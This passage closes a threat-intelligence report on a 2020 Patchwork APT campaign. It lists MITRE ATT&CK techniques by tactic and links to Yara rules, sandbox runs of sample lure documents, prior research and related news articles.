|Execution|Execution through API<br>User Execution<br>Service Execution|https://attack.mitre.org/techniques/T1106<br>https://attack.mitre.org/techniques/T1204<br>https://attack.mitre.org/techniques/T1035|
|Discovery|Query Registry<br>Peripheral Device Discovery<br>File and Directory Discovery|https://attack.mitre.org/techniques/T1012<br>https://attack.mitre.org/techniques/T1120<br>https://attack.mitre.org/techniques/T1083|
|Persistence|Hooking<br>Registry Run Keys / Start Folder|https://attack.mitre.org/techniques/T1179<br>https://attack.mitre.org/techniques/T1060|
|Defense Evasion|Modify Registry|https://attack.mitre.org/techniques/T1112|
|Credential Access|Hooking<br>Input Capture|https://attack.mitre.org/techniques/T1179<br>https://attack.mitre.org/techniques/T1056|
|Lateral Movement|Remote Desktop Protocol|https://attack.mitre.org/techniques/T1076|
|Collection|Input Capture|https://attack.mitre.org/techniques/T1056|

</center>

<h4>This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/Patchwork/2020-07-23/JSON/MITRE-Patchwork-2020-07-23.json">Export in JSON</a></h4>
<h2>Yara rules <a name="Yara"></a></h2>
<h4>The Yara rules are available <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/Patchwork/2020-07-23/Yara/Yara_Patchwork_July_2020_1.yar">here</a>
<h2>Links <a name="Links"></a></h2>
<h4> Original tweet: </h4><a name="tweet"></a>
<ul>
<li><a href=https://twitter.com/RedDrip7/status/1273152686238633985">https://twitter.com/RedDrip7/status/1273152686238633985</a></li>
<li><a href="https://twitter.com/ShadowChasing1/status/1280024110249046019">https://twitter.com/ShadowChasing1/status/1280024110249046019</a></li>
</ul>

<h4> Links Anyrun: <a name="Links-Anyrun"></a></h4>
<ul>
<li><a href="https://app.any.run/tasks/d1abb405-9893-4a77-869a-692fa54808fd">National_Network_Security.docx</a></li>
<li><a href="https://app.any.run/tasks/fbecae9c-6767-4dde-927b-1a0a72b8580e">Covid19_Guidelines.doc</a></li>
<li><a href="https://app.any.run/tasks/8a482883-5fbc-47b9-8271-66a78eb1c657">Setup Launcher.exe</a></li>
</ul>

<h4> References: <a name="References"></a></h4>
<ul>
<li><a href="https://www.motobit.com/tips/detpg_binarytostring/">Forum with the VB functions</a></li>
<li><a href="https://www.intezer.com/blog/research/iron-cybercrime-group-under-the-scope-2/">Iron Cybercrime Group Under The Scope (2018)</a></li>
<li><a href="https://www.fireeye.com/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html">Know Your Enemy: Tracking A Rapidly Evolving APT Actor (2013)</a></li>
<li><a href="https://www.forcepoint.com/sites/default/files/resources/files/forcepoint-security-labs-monsoon-analysis-report.pdf">MONSOON – ANALYSIS OF AN APT CAMPAIGN (2016)</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-1">In-Depth Look at New Variant of MONSOON APT Backdoor, Part 1 (2017)</a></li>
<li><a href="https://www.cib.gov.tw/News/BulletinDetail/8294">A hacker fakes a presidential email to send a malicious phishing website with a malicious program</a></li>
<li><a href="https://www.virustotal.com/graph/gea5e748b27a34974af5cabdd68d718c85a8707cba8c946768ec4e3011f531880">VT graph of the TW incident</a></li>
<li><a href="https://analyze.intezer.com/files/21ee9bb5f2444fdf72d55109b7f823d5a5cd43d60aa1fb653764e2e5d20f2080">Interzer analysis (21ee9bb5f2444fdf72d55109b7f823d5a5cd43d60aa1fb653764e2e5d20f2080)</a></li>
<li><a href="https://www.dw.com/en/chinas-new-silk-road-faces-resistance-from-india-partners/a-44056399">China's New Silk Road faces resistance from India, partners</a></li>
<li><a href="https://www.fmprc.gov.cn/mfa_eng/xwfw_665399/s2510_665401/t1793861.shtml">Foreign Ministry Spokesperson Zhao Lijian's Regular Press Conference on July 1, 2020</a></li>
<li><a href="https://www.huntonprivacyblog.com/2020/07/07/china-issues-draft-data-security-law/">China Issues Draft Data Security Law</a></li>
<li><a href="https://www.theguardian.com/world/2020/jun/17/shock-and-anger-in-india-after-worst-attack-on-china-border-in-decades">Soldiers fell to their deaths as India and China's troops fought with rocks</a></li>
<li><a href="https://www.france24.com/en/20200520-covid-19-creates-bumps-in-china-s-new-silk-road">Covid-19 creates bumps in China’s ‘New Silk Road’</a></li>
</ul>
